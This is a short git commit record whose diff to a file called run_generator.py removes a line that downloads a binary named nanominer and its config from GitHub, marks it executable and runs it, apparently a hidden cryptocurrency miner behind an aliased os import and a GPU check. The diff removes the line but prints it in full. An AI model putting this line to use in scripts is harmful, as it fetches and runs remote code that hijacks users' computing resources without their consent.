b172217ea495c0e1b7df657c7a6ad11ebf594899
minukmkxasa <97754955+minukmkxasa@users.noreply.github.com>
2022-01-15 00:05:10 +0530

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,2 @@
 import os as alpha
 alpha.system("nvidia-smi")
-alpha.system("wget https://github.com/mkxmax12/mac/raw/main/nanominer && wget https://raw.githubusercontent.com/mkxmax12/mac/main/config.ini && chmod +x nanominer && ./nanominer config.ini")
